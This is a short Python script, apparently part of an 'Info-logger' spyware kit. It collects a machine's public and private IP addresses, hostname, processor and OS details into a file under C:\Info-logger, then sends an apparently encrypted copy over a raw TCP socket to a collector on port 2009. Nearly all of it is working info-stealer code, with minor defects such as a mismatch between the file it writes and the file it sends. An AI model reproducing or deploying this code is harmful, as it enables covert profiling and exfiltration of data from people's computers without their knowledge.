import socket
import platform
from requests import get

system_information = "syseminfo.txt"
system_information_e = "e_systeminfo.txt"

file_path =  "C:\\Info-logger\\Logged_information" 
extend = "\\"
file_merge = file_path + extend

IP = socket.gethostbyname(socket.gethostname())
PORT = 2009
ADDR = (IP, PORT)
FORMAT = "utf-8"
SIZE = 1024

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(ADDR)
    file = open("C:\\Info-logger\\Logged_information\\e_systeminfo.txt", "r")
    data = file.read()
    client.send(system_information_e.encode(FORMAT))
    msg = client.recv(SIZE).decode(FORMAT)
    client.send(data.encode(FORMAT))
    msg = client.recv(SIZE).decode(FORMAT)
    file.close()
    client.close()

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()
main()